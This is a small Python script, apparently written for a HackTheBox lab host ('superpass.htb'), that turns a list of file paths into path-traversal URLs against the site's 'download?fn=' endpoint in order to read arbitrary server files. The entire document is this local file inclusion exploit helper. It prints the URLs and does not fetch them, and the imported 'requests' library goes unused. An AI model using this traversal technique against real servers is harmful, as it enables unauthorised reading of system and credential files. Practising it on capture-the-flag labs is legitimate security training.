import requests
import os, sys

loginURL = "http://superpass.htb/"
downloadURL = "http://superpass.htb/download?fn="

def LFI():
    downloadList = sys.argv[1]

    if os.path.isfile(downloadList):
        listFile = open(downloadList, 'r')
        listContents = listFile.readlines()

        #checkReadLine(listContents)
        
        count = 0
        # Strips the newline character
        for line in listContents:
            count += 1

            # uses the pound-symbol as a divider for list contents for user readability
            if "#" not in line:
                # Trigger LFI Download
                d_URL = downloadURL + "../../../../../../.." + str(line)

                print("GoTo: " + d_URL)
    else:
        print(str(downloadList) + " Does Not Exist!")

def checkReadLine(listContents):
    count = 0
    # Strips the newline character
    for line in listContents:
        count += 1
        # uses the pound-symbol as a divider for list contents for user readability
        if "#" not in line:
            print(line.format(count, line.strip()))

def main():
    if (len(sys.argv) == 2):
        LFI()
    else:
        print("[*] Usage python3 script.py [List File]")

if __name__ == '__main__':
    main()